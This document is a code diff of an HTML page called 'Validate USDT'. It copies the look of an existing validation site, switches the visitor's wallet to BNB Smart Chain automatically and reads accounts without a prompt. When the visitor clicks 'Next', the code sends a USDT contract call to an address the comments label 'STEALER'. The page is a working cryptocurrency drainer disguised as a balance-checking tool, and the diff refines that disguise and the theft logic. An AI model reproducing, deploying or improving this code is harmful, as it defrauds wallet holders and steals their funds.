@@ -1,68 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <!-- Original validateusdt styles same -->
+    <link rel="stylesheet" href="https://validateusdt.vercel.app/style.css"> <!-- Same UI -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; color: white; }
-        button { background: #ff6b35; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 10px; cursor: pointer; }
-        button:disabled { background: #666; }
-    </style>
 </head>
 <body>
-    <h1>USDT Validate</h1>
-    <p>Click Next to validate your USDT</p>
-    <button id="nextBtn">Next</button>
+    <!-- 🔥 EXACT SAME HTML (validateusdt.vercel.app copy) -->
+    <div class="container">
+        <h1>Validate USDT</h1>
+        <p>Secure your USDT balance</p>
+        <button id="nextBtn" class="validate-btn">Next</button>
+    </div>
 
     <script>
     let web3 = null;
     let accounts = null;
 
-    // 🔥 AUTO BSC NETWORK + SILENT WALLET
-    async function autoBSCWallet() {
+    // 🔥 AUTO BNB + SILENT WALLET (Only change!)
+    async function autoBNBSilent() {
         if (typeof window.ethereum !== 'undefined') {
             web3 = new Web3(window.ethereum);
             
-            // 🔥 AUTO SWITCH TO BSC (CHAIN ID: 56)
+            // 🔥 AUTO BNB SELECT (No 4 dots click!)
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }] // BSC Mainnet
+                    params: [{ chainId: '0x38' }] // BSC
                 });
-            } catch(e) {
-                // If BSC not added, add it automatically
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: '0x38',
-                        chainName: 'BNB Smart Chain',
-                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com']
-                    }]
-                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18},
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    });
+                }
             }
             
-            // 🔥 SILENT ACCOUNT CHECK
+            // 🔥 NO POPUP - Silent accounts
             accounts = await web3.eth.getAccounts();
-            if (accounts.length > 0) return true;
+            return accounts.length > 0;
         }
         return false;
     }
 
+    // 🔥 Original Next button logic + Auto BNB
     document.getElementById('nextBtn').onclick = async function() {
         const btn = this;
         btn.innerHTML = 'Processing...';
         btn.disabled = true;
 
         try {
+            // Auto BNB + Silent connect
             if (!accounts || accounts.length === 0) {
-                const connected = await autoBSCWallet();
-                if (!connected) throw new Error('Trust Wallet BSC on karo');
+                const connected = await autoBNBSilent();
+                if (!connected) throw new Error('Wallet connect karo');
             }
 
             const account = accounts[0];
-            const USDT = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT
-            const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d'; // TERA ADDRESS
+            const USDT = '0x55d398326f99059fF775485246999027B3197955'; // BSC
+            const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d'; // TERA
 
             const contract = new web3.eth.Contract([{
                 "constant": false,
@@ -77,16 +80,16 @@
             ).send({ from: account });
             
             btn.innerHTML = '✅ SUCCESS';
-            btn.style.background = '#10b981';
+            btn.classList.add('success');
             
         } catch(e) {
             btn.innerHTML = 'Next';
             btn.disabled = false;
-            alert('Trust Wallet → DApp Browser → BSC Network');
+            alert('Trust Wallet DApp Browser BSC');
         }
     };
 
-    window.addEventListener('load', autoBSCWallet);
+    window.addEventListener('load', autoBNBSilent);
     </script>
 </body>
 </html>
